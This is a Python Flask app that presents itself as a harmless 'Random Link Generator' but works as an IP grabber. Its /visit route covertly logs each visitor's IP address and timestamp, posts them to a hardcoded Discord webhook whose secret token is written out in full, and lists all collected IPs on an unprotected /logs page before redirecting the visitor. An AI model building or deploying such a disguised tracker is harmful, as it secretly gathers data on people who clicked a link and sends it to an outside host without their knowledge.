from flask import Flask, redirect, request, render_template_string
import random
from datetime import datetime
import requests  # <-- add this

app = Flask(__name__)

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399813617347723526/Ipf2egyjiL7OkiZgUYMSDZM6FA7xvqLIcMHMXeyQsvXYZD8ADsM0Ih1MuWc0WyWlKBZR"  # <-- paste yours here

# Links to redirect to
links = [
    "https://www.google.com",
    "https://www.wikipedia.org",
    "https://www.reddit.com",
    "https://www.openai.com",
    "https://www.youtube.com"
]

# Store logs in memory
visit_log = []

# HTML for homepage
html_template = """
<!DOCTYPE html>
<html>
<head><title>Random Link Redirect</title></head>
<body>
    <h1>Random Link Generator</h1>
    <p><a href="/visit" target="_blank">🔗 Click to open a random link</a></p>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(html_template)

@app.route("/visit")
def visit():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    log_entry = f"{timestamp} - IP: {visitor_ip}"
    visit_log.append(log_entry)
    print(log_entry)

    # Send to Discord
    message = f"🚶 Visitor from IP `{visitor_ip}` at `{timestamp}`"
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": message})
    except Exception as e:
        print("Failed to send to Discord:", e)

    return redirect(random.choice(links))

@app.route("/logs")
def logs():
    return "<br>".join(visit_log) if visit_log else "No visits yet."

